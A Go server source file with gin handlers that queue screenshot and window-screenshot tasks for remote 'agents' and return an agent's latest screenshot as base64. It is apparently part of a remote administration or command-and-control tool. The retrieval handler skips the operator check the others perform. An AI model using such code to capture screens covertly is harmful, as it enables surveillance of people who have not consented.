package server

import (
	"encoding/base64"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/gin-gonic/gin"
)

func (s *Server) handleRequestScreenshot(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "screenshot", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("Screenshot requested", "agent", id)
	s.dispatchTask(c, task, "request_screenshot", "screenshot")
}

// handleGetAgentScreenshot returns the latest screenshot for an agent as base64.
func (s *Server) handleGetAgentScreenshot(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	screenshotDir := filepath.Join(s.cfg.Server.DataDir, "screenshots", id)
	entries, err := os.ReadDir(screenshotDir)
	if err != nil || len(entries) == 0 {
		respondError(c, http.StatusNotFound, "no screenshot available")
		return
	}

	var newest os.DirEntry
	var newestTime time.Time
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		if newest == nil || info.ModTime().After(newestTime) {
			newest = e
			newestTime = info.ModTime()
		}
	}
	if newest == nil {
		respondError(c, http.StatusNotFound, "no screenshot available")
		return
	}

	raw, err := os.ReadFile(filepath.Join(screenshotDir, newest.Name()))
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to read screenshot")
		return
	}

	encoded := base64.StdEncoding.EncodeToString(raw)
	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"image":   encoded,
	})
}

func (s *Server) handleRequestScreenshotWindow(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "screenshot_window", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}

	slog.Info("Window screenshot requested", "agent", id)
	s.dispatchTask(c, task, "request_screenshot_window", "screenshot_window")
}
